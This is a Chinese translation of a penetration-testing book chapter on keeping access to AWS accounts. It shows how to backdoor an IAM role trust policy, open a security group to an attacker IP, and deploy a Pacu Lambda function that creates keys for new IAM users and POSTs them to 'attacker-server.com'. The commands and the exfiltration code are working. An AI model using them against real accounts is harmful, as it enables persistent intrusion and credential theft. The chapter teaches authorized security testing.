IAM 角色有一个与之关联的文档，称为其信任策略。信任策略是一个 JSON 策略文档（例如 IAM 策略，如`ReadOnlyAccess`或`AdministratorAccess`），指定谁/什么可以假定该角色，以及在什么条件下允许或拒绝。允许 AWS EC2 服务假定某个角色的常见信任策略文档可能如下所示：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Service": "ec2.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

这个策略允许 EC2 服务访问它所属的角色。这个策略可能会在 IAM 角色被添加到 EC2 实例配置文件，然后附加到 EC2 实例时使用。然后，附加角色的临时凭证可以从实例内部访问，EC2 服务将使用它来访问所需的任何内容。

对于我们攻击者来说，IAM 角色的一些特性非常适合我们：

+   角色信任策略可以随意更新

+   角色信任策略可以提供对其他 AWS 账户的访问

就建立持久性而言，这是完美的。这意味着，通常情况下，我们只需要更新目标账户中特权角色的信任策略，就可以在该角色和我们自己的攻击者 AWS 账户之间建立信任关系。

在我们的示例场景中，我们创建了两个 AWS 账户。其中一个（账户 ID `012345678912`）是我们自己的个人攻击者账户，这意味着我们通过 AWS 个人注册了这个账户。另一个（账户 ID `111111111111`）是我们已经获取了密钥的账户。我们想要建立跨账户持久性，以确保我们将来能够访问环境。这意味着即使防御者检测到了我们的入侵，我们仍然可以通过跨账户方法重新访问环境，从而在不打开任何其他安全漏洞的情况下保持对目标环境的访问。

# 寻找合适的目标角色

建立这种持久性的第一步将是找到一个合适的目标角色。并非所有角色都允许你更新它们的信任策略文档，这意味着我们不想以它们为目标。它们通常是服务关联角色，这是一种直接与 AWS 服务关联的独特类型的 IAM 角色（[`docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html`](https://docs.aws.amazon.com/IAM/latest/UserGuide/using-service-linked-roles.html)）。

这些角色可以通过 AWS Web 控制台的 IAM 角色页面以几种不同的方式快速识别。首先，你可能会发现它们的名称以`AWSServiceRoleFor`开头，后面跟着它们所属的 AWS 服务。另一个指示是在角色列表的受信实体列中；它会说类似于`AWS service:<service name>(Service-Linked role)`。如果你看到`Service-Linked role`的说明，那么你就知道你不能更新信任策略文档。最后，所有 AWS 服务关联角色都将包括路径`/aws-service-role/`。其他角色不允许使用该路径创建新角色：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/928e2843-f15c-4672-a0c7-264f13130378.png)

图 4：我们测试账户中的两个服务关联角色

不过不要被骗了！仅仅依靠名称来指示哪些角色是服务角色，你可能会上当。一个完美的例子就是下面的截图，其中显示了角色`AWSBatchServiceRole`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d7081826-2480-44ac-aebf-f8a9289b4375.png)

`AWSBatchServiceRole`这个名字显然表明这个角色是一个服务关联角色，对吗？错。如果你注意到，在`AWS service: batch`之后没有`(Service-Linked role)`的说明。所以，这意味着我们可以更新这个角色的信任策略，即使它听起来像是一个服务关联角色。

在我们的测试环境中，我们找到了一个名为`Admin`的角色，这对于攻击者来说应该立即引起`高特权`的警觉，所以我们将以这个角色为目标进行持久性攻击。我们不想在目标环境中搞砸任何事情，所以我们希望将自己添加到信任策略中，而不是用我们自己的策略覆盖它，这可能会在环境中搞砸一些东西。如果我们不小心移除了对某个 AWS 服务的访问权限，依赖于该访问权限的资源可能会开始失败，而我们不希望出现这种情况，有很多不同的原因。

从`iam:GetRole`和`iam:ListRoles`返回的数据应该已经包括我们想要的角色的活动信任策略文档，在 JSON 响应对象的`AssumeRolePolicyDocument`键下。我们要定位的管理员角色如下：

```
{
    "Path": "/",
    "RoleName": "Admin",
    "RoleId": "AROAJTZAUYV2TQBZ2LXUK",
    "Arn": "arn:aws:iam::111111111111:role/Admin",
    "CreateDate": "2018-11-06T18:48:08Z",
    "AssumeRolePolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "AWS": "arn:aws:iam::111111111111:root"
                },
                "Action": "sts:AssumeRole"
            }
        ]
    },
    "Description": "",
    "MaxSessionDuration": 3600
}
```

如果我们查看`AssumeRolePolicyDocument` > `Statement`下的值，我们可以看到目前只允许一个主体假定这个角色，即**Amazon 资源名称**（**ARN**）`arn:aws:iam::111111111111:root`。这个 ARN 指的是帐户 ID 为`111111111111`的帐户的根用户，基本上可以翻译为`帐户 ID 111111111111 中的任何资源`。这包括根用户、IAM 用户和 IAM 角色。

# 添加我们的后门访问

我们现在将把我们的攻击者拥有的账户添加为此角色的信任策略。首先，我们将把角色信任策略中`AssumeRolePolicyDocument`键的值保存到本地 JSON 文件（`trust-policy.json`）中。为了向我们自己的账户添加信任而不移除当前的信任，我们可以将`Principal` `AWS`键的值从字符串转换为数组。这个数组将包括已经存在的根 ARN 和我们攻击者账户的根 ARN。`trust-policy.json`现在应该看起来像下面这样：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": [
                    "arn:aws:iam::111111111111:root",
                    "arn:aws:iam::012345678912:root"
                ]
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

接下来，我们将使用 AWS CLI 更新具有此信任策略的角色：

```
aws iam update-assume-role-policy --role-name Admin --policy-document file://trust-policy.json --profile Test 
```

如果一切顺利，那么 AWS CLI 不应该向控制台返回任何输出。否则，您将看到一个错误和一个简短的描述出了什么问题。如果我们想要确认一切都正确，我们可以使用 AWS CLI 来`get`该角色并再次查看信任策略文档：

```
aws iam get-role --role-name Admin --profile Test 
```

该命令的响应应该包括您刚刚上传的信任策略。

我们唯一需要做的另一件事是将角色的 ARN 保存在本地某个地方，这样我们就不会忘记它。在这个例子中，我们目标角色的 ARN 是`arn:aws:iam::111111111111:role/Admin`。现在一切都完成了。

# 确认我们的访问

我们可以通过尝试从我们自己的攻击者账户内部“假定”我们的目标角色来测试我们的新持久性方法。已经有一个名为`MyPersonalUser`的本地 AWS CLI 配置文件，这是属于我的个人 AWS 账户的一组访问密钥。使用这些密钥，我应该能够运行以下命令：

```
aws sts assume-role --role-arn arn:aws:iam::111111111111:role/Admin --role-session-name PersistenceTest --profile MyPersonalUser 
```

我们只需要提供我们想要凭证的角色的 ARN 和角色会话名称，这可以是与返回的临时凭证关联的任意字符串值。如果一切按计划进行，AWS CLI 应该会以以下类似的方式做出响应：

```
{
    "Credentials": {
        "AccessKeyId": "ASIATE66IJ1KVECXRQRS",
        "SecretAccessKey": "hVhO4zr7gbrVBYS4oJZBTeJeKwTd1bPVWNZ9At7a",
        "SessionToken": "FQoGZXIvYXdzED0aAJslA+vx8iKMwQD0nSLzAaQ6mf4X0tuENPcN/Tccip/sR+aZ3g2KJ7PZs0Djb6859EpTBNfgXHi1OSWpb6mPAekZYadM4AwOBgjuVcgdoTk6U3wQAFoX8cOTa3vbXQtVzMovq2Yu1YLtL3LhcjoMJh2sgQUhxBQKIEbJZomK9Dnw3odQDG2c8roDFQiF0eSKPpX1cI31SpKkKdtHDignTBi2YcaHYFdSGHocoAu9q1WgXn9+JRIGMagYOhpDDGyXSG5rkndlZA9lefC0M7vI5BTldvmImgpbNgkkwi8jAL0HpB9NG2oa4r0vZ7qM9pVxoXwFTA1I8cyf6C+Vvwi5ty/3RaiZ1IffBQ==",
        "Expiration": "2018-11-06T20:23:05Z"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAJTZAUYV2TQBZ2LXUK:PersistenceTest",
        "Arn": "arn:aws:sts::111111111111:assumed-role/Admin/PersistenceTest"
    }
}
```

完美！现在，我们所做的是使用我们自己的个人账户凭据来检索我们目标 AWS 账户的凭据。只要我们仍然是受信任的实体，我们随时都可以运行相同的`aws sts` API 调用，并在需要时检索另一组临时凭据。

我们可以通过修改我们的`~/.aws/credentials`文件使这些密钥对 AWS CLI 可用。配置文件只需要额外的`aws_session_token`键，这将导致以下内容被添加到我们的凭据文件中：

```
[PersistenceTest]
aws_access_key_id = ASIATE66IJ1KVECXRQRS
aws_secret_access_key = hVhO4zr7gbrVBYS4oJZBTeJeKwTd1bPVWNZ9At7a
aws_session_token = "FQoGZXIvYXdzED0aAJslA+vx8iKMwQD0nSLzAaQ6mf4X0tuENPcN/Tccip/sR+aZ3g2KJ7PZs0Djb6859EpTBNfgXHi1OSWpb6mPAekZYadM4AwOBgjuVcgdoTk6U3wQAFoX8cOTa3vbXQtVzMovq2Yu1YLtL3LhcjoMJh2sgQUhxBQKIEbJZomK9Dnw3odQDG2c8roDFQiF0eSKPpX1cI31SpKkKdtHDignTBi2YcaHYFdSGHocoAu9q1WgXn9+JRIGMagYOhpDDGyXSG5rkndlZA9lefC0M7vI5BTldvmImgpbNgkkwi8jAL0HpB9NG2oa4r0vZ7qM9pVxoXwFTA1I8cyf6C+Vvwi5ty/3RaiZ1IffBQ=="
```

然后我们可以手动将这些凭据添加到 Pacu 中，或者我们可以从 AWS CLI 导入它们到 Pacu 中。

# 使用 Pacu 自动化

就像前一节关于后门用户的部分一样，这一切都可以很容易地自动化！除此之外，它已经为您自动化了，使用`iam__backdoor_assume_role` Pacu 模块。该模块接受三个不同的参数，但我们只会使用其中的两个。`--role-names`参数接受要在我们的目标账户中设置后门的 IAM 角色列表，`--user-arns`参数接受要为每个目标角色添加信任关系的 ARN 列表。如果我们要复制刚刚经历的情景，那么我们将运行以下 Pacu 命令：

```
run iam__backdoor_assume_role --role-names Admin --user-arns arn:aws:iam::012345678912:root 
```

Pacu 将自动设置`Admin`角色的后门，并与我们提供的 ARN 建立信任关系。输出应该看起来像这样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7327d803-84a1-4735-b740-444466a00ed2.png)

图 5：运行 Pacu iam__backdoor_assume_role 模块

如果我们不知道我们想要攻击的角色，我们可以省略`--role-names`参数。然后 Pacu 将收集账户中的所有角色，并给我们一个选择列表。

这里有一个相当重要的副注，你可能一直在想，信任策略文档确实接受通配符，比如星号（*）字符！信任策略可以使用通配符，以便任何东西都可以假定该角色，这实际上意味着任何东西。信任每个人拥有 IAM 角色绝不是一个好主意，特别是如果你正在攻击一个账户。你不希望打开环境中原本不存在的门，其他攻击者可能会趁机溜进来。然而，了解通配符角色信任策略的确切含义是很重要的，因为在账户中遇到这样的情况是很少见的。

# EC2 安全组的后门

EC2 安全组充当管理一个或多个 EC2 实例的入站和出站流量规则的虚拟防火墙。通常，你会发现对实例上特定端口的流量被列入白名单，以允许来自其他 IP 范围或安全组的流量。默认情况下拒绝所有访问，可以通过创建新规则来授予访问权限。作为攻击者，我们无法绕过安全组规则，但这并不意味着我们的访问完全被阻止。

我们所需要做的就是向目标安全组添加我们自己的安全组规则。理想情况下，这将是一个允许我们的 IP 地址/范围到安全组适用的实例上的一组端口的规则。你可能认为你想要为所有端口（`0`-`65535`）和所有协议（TCP、UDP 等）添加白名单访问，但一般来说，这是一个坏主意，因为有一些非常基本的检测存在。允许流量到安全组的每个端口被认为是一种不好的做法，因此有许多工具会对这种安全组规则发出警报。

知道检测所有端口都允许入站是典型的最佳实践检查，我们可以将我们的访问精细化到一些常见端口的子集。这些端口可能只是一个较短的范围，比如`0`-`1024`，一个常见端口，比如端口`80`，你知道他们在目标服务器上运行的服务的端口，或者你想要的任何东西。

使用我们同样的`Test`用户，假设我们发现了一个我们想要攻击的 EC2 实例。这可能是通过像下面的 AWS CLI 命令描述当前区域中的 EC2 实例：

```
aws ec2 describe-instances --profile Test 
```

这个命令返回了相当多的信息，但重要的信息是我们目标的实例 ID（`i-08311909cfe8cff10`），我们目标的公共 IP（`2.3.4.5`），以及附加到它的安全组的列表：

```
"SecurityGroups": [
    {
        "GroupName": "corp",
        "GroupId": "sg-0315cp741b51fr4d0"
    }
]
```

有一个附加到目标实例的单个组名为`corp`；我们可以猜测它代表公司。现在我们有了安全组的名称和 ID，但我们想要看看它上面已经存在的规则。我们可以通过运行以下 AWS CLI 命令找到这些信息：

```
aws ec2 describe-security-groups --group-ids sg-0315cp741b51fr4d0 --profile Test 
```

该命令的响应应该显示已添加到安全组的入站和出站规则。响应的`IpPermissions`键包含入站流量规则，`IpPermissionsEgress`键包含出站流量规则。我们目标`corp`安全组的入站流量规则如下：

```
"IpPermissions": [
    {
        "FromPort": 27017,
        "IpProtocol": "tcp",
        "IpRanges": [
            {
                "CidrIp": "10.0.0.1/24"
            }
        ],
        "Ipv6Ranges": [],
        "PrefixListIds": [],
       "ToPort": 27018,
        "UserIdGroupPairs": []
    }
]
```

我们所看到的是允许来自 IP 范围`10.0.0.1/24`到范围`27017`到`27018`的任何端口的入站 TCP 访问。也许你认识这些端口！这些端口通常属于 MongoDB，一种 NoSQL 数据库。问题是访问被列入白名单到一个内部 IP 范围，这意味着我们已经需要在网络中有一个立足点才能访问这些端口。这就是我们将添加我们的后门安全组规则，以便我们可以直接访问 MongoDB 的地方。

为了做到这一点，我们可以使用`ec2:AuthorizeSecurityGroupIngress` API。我们将说我们自己的攻击者 IP 地址是`1.1.1.1`，我们已经知道要打开访问权限的端口，所以我们可以运行以下 AWS CLI 命令：

```
aws ec2 authorize-security-group-ingress --group-id sg-0315cp741b51fr4d0 --protocol tcp --port  27017-27018 --cidr 1.1.1.1/32
```

如果一切顺利，您将不会看到此命令的任何输出，但如果出现问题，将会出现错误。现在我们的后门规则已成功应用，我们所针对的安全组中的每个 EC2 实例现在应该允许我们访问。请记住，可以指定`0.0.0.0/0`作为您的 IP 地址范围，并且它将允许任何 IP 地址访问。作为攻击者，我们绝对不希望这样做，因为这将打开其他攻击者可能发现和滥用的环境入口，因此我们始终要确保即使我们的后门访问规则也是细粒度的。

现在我们可以尝试远程访问 MongoDB，以测试我们的后门规则是否成功，并希望获得对以前私有的 MongoDB 服务器的访问权限。以下屏幕截图显示我们连接到端口`27017`上的 Mongo 数据库，服务器的一些错误配置对我们有利。如屏幕截图的轮廓部分所示，访问控制（身份验证）未设置，这意味着我们可以在不需要凭据的情况下读取和写入数据库。下一条消息显示 Mongo 进程正在以 root 用户身份运行，这意味着如果我们能够在 Mongo 服务器上执行任何文件读取或代码执行，它将以 root 用户身份运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a765957b-d8e1-44fc-afe1-98fc2732d516.png)

就像前面的部分一样，这对您来说可能已经被 Pacu 自动化了！我们可以针对一个或多个安全组，但默认情况下，Pacu 将使用您指定的规则在当前区域中的所有组中设置后门。要复制我们刚刚经历的过程，我们可以运行以下 Pacu 命令（Pacu 使用安全组名称而不是 ID，因此我们提供`corp`）：

```
run ec2__backdoor_ec2_sec_groups --ip 1.1.1.1/32 --port-range 27017-27018 --protocol tcp --groups corp@us-west-2 
```

然后 Pacu 将向目标安全组添加我们的后门规则。但是永远不要忘记`--ip`参数，因为您不希望向世界（`0.0.0.0/0`）打开任何东西。以下屏幕截图显示了前面 Pacu 命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8bbbbcd4-3706-4055-8fa5-69ef058fd30d.png)

图 6：Pacu 在后门公司安全组时的输出

然后，如果您要查看应用于该安全组的规则，您将看到类似于这样的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9022b74d-78b2-4d7d-b26f-2d16f23e40a1.png)

图 7：我们目标安全组上的后门规则

# 使用 Lambda 函数作为持久看门狗

现在，在帐户中创建我们的持久后门非常有用，但是如果即使这些后门被检测到并从环境中删除了呢？我们可以使用 AWS Lambda 作为看门狗来监视帐户中的活动，并对某些事件做出响应，从而允许我们对防御者的行动做出反应。

基本上，AWS Lambda 是您在 AWS 中运行无服务器代码的方式。简单来说，您上传您的代码（无论是 Node.js、Python 还是其他任何东西），并为您的函数设置一个触发器，当触发器被触发时，您的代码在云中执行并对传入的数据进行处理。

我们攻击者可以利用这一点做很多事情。我们可以用它来警示帐户中的活动：

+   这些活动可能有助于我们利用该帐户

+   这可能意味着我们已经被防御者发现。

Lambda 函数还有很多其他用途，但现在我们将专注于这个。

# 使用 Lambda 自动化凭据外泄

从上一节的第一点开始，我们希望一个 Lambda 函数在可能值得利用的事件上触发。我们将把这与本章前面描述的持久性方法联系起来，因此对于后门 IAM 用户，可能值得利用的事件可能是创建新用户时。我们可以使用 CloudWatch Events 触发我们的 Lambda 函数，然后运行我们的代码，该代码设置为自动向该用户添加一组新的访问密钥，然后将这些凭证外发到我们指定的服务器。

这种情况如下绑定在一起：

1.  攻击者（我们）在目标账户中创建了一个恶意 Lambda 函数

1.  攻击者创建了一个触发器，每当创建新的 IAM 用户时就运行 Lambda 函数

1.  攻击者在他们控制的服务器上设置一个监听器，等待凭证

1.  经过 2 天

1.  环境中的普通用户创建了一个新的 IAM 用户

1.  攻击者的 Lambda 函数被触发

1.  该函数向新创建的用户添加一组访问密钥

1.  该函数使用创建的凭证向攻击者的服务器发出 HTTP 请求

现在攻击者只需坐下来等待凭证流入他们的服务器。

这可能看起来是一个复杂的过程，但简单来说，你可以把它看作是一种持久性建立持久性的方法。我们已经知道如何首先建立持久性，所以 Lambda 增加的是连续执行的能力。

要触发事件的函数，例如创建用户，必须创建一个 CloudWatch Event 规则。CloudWatch Event 规则是一种基本上说——如果我在环境中看到这种情况发生，就执行这个动作的方法。为了使我们的 CloudWatch Event 规则正常工作，我们还需要在`us-east-1`地区启用 CloudTrail 日志记录。这是因为我们是由 IAM 事件（`iam:CreateUser`）触发的，并且 IAM 事件只传递到`us-east-1` CloudWatch Events。在大多数情况下，CloudTrail 日志记录将被启用。最佳做法是在所有 AWS 地区启用它，如果 CloudTrail 未启用，则您可能处于一个不太完善的环境中，需要关注其他问题。

# 使用 Pacu 部署我们的后门

创建后门 Lambda 函数、创建 CloudWatch Events 规则并连接两者的过程可能会很烦人，因此已经自动化并集成到 Pacu 中。

我们将要查看的第一个 Pacu 模块称为`lambda__backdoor_new_users`，它基本上只是自动化了在环境中为新创建的用户创建后门并外发凭证的过程。如果我们查看 Pacu 模块使用的 Lambda 函数的源代码，我们会看到以下内容：

```
import boto3
from botocore.vendored import requests
def lambda_handler(event,context):
 if event['detail']['eventName']=='CreateUser':
 client=boto3.client('iam')
 try:
 response=client.create_access_key(UserName=event['detail']['requestParameters']['userName'])
 requests.post('POST_URL',data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']})
 except:
 pass
 return
```

代码的作用只是检查触发它的事件是否是`iam:CreateUser` API 调用，如果是，它将尝试使用 Python 的`boto3`库为新创建的用户创建凭证。然后一旦成功，它将发送这些凭证到攻击者的服务器，这由`POST_URL`指示（Pacu 在启动函数之前替换该字符串）。

模块的其余代码设置了所有必需的资源，或者删除了它知道您在账户中启动的任何后门，有点像清理模式。

接收我们创建的凭证，我们需要在自己的服务器上启动一个 HTTP 监听器，因为凭证是在请求体中`POST`的。之后，我们只需运行以下 Pacu 命令，希望凭证开始涌入：

```
run lambda__backdoor_new_users --exfil-url http://attacker-server.com/
```

当 Pacu 命令完成时，目标账户现在应该已经设置了我们的 Lambda 后门。只要环境中的其他人创建了一个新的 IAM 用户，我们应该收到一个带有这些凭证的 HTTP 监听器的请求。

以下截图显示了运行`lambda__backdoor_new_users` Pacu 模块的一些输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/482885c6-1634-4167-bc6a-5b3a6127c6c0.png)

现在，下一个截图显示了在有人在我们的目标环境中创建用户后，向我们的 HTTP 服务器 POST 的凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fc4f4128-1065-4292-b803-1dd997d58bcf.png)

我们可以看到访问密钥 ID 和秘密访问密钥都包含在这个 HTTP POST 请求的正文中。现在我们已经为一个用户收集了密钥，如果我们觉得有必要，我们可以删除我们的后门（您不应该在您正在测试的环境中留下任何东西！）。为了做到这一点，我们可以运行以下 Pacu 命令：

```
run lambda__backdoor_new_users --cleanup
```

这个命令应该输出类似以下截图的内容，表明它已经删除了我们之前创建的后门资源：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e7c1f06d-0048-4c4b-9ae4-753254afac30.png)

# 其他 Lambda Pacu 模块

除了`lambda__backdoor_new_users` Pacu 模块之外，还有另外两个：

+   `lambda__backdoor_new_sec_groups`

+   `lambda__backdoor_new_roles`

`lambda__backdoor_new_sec_groups`模块可以用于在创建新的 EC2 安全组时设置后门，通过将我们自己的 IP 地址列入白名单，而`lambda__backdoor_new_roles`模块将修改新创建角色的信任关系，允许我们跨账户假定它们，然后它将外泄角色的 ARN，以便我们可以继续收集我们的临时凭据。这两个模块都像我们之前介绍的`lambda__backdoor_new_users`模块一样，在 AWS 账户中部署资源，这些资源会根据事件触发，并且它们有清理选项来删除这些资源。

`lambda__backdoor_new_sec_groups`模块使用 EC2 API（而不是 IAM），因此不需要在`us-east-1`中创建 Lambda 函数；相反，它应该在您希望在其中设置新安全组后门的区域中启动。

# 总结

在本章中，我们已经看到了如何在目标 AWS 环境中建立持久访问的方法。这可以直接完成，就像我们展示的那样，比如向其他 IAM 用户添加后门密钥，或者我们可以使用更长期的方法，比如 AWS Lambda 和 CloudWatch Events 等服务。在目标 AWS 账户中，您可以建立各种不同的持久性方式，但有时候只需要对目标进行一些研究，就可以确定一个好的位置。

Lambda 提供了一个非常灵活的平台，可以在我们的目标账户中对事件做出反应和响应，这意味着我们可以在资源创建时建立持久性（或更多）；然而，就像我们通过给 EC2 安全组设置后门所展示的那样，并不是每个后门都需要基于/在 IAM 服务中，并且有时候可以成为其他类型访问的后门。本章旨在展示一些常见的持久性方法，以帮助您发现在您的工作中其他持久性方法。

与在账户中创建新资源（可能会引起注意）不同，也可以对现有的 Lambda 函数设置后门。这些攻击对您所针对的环境更具体，并且需要不同的权限集，但可以更隐蔽和持久。这些方法将在下一章中讨论，我们将讨论 AWS Lambda 的渗透测试，调查现有 Lambda 函数的后门和数据外泄等。
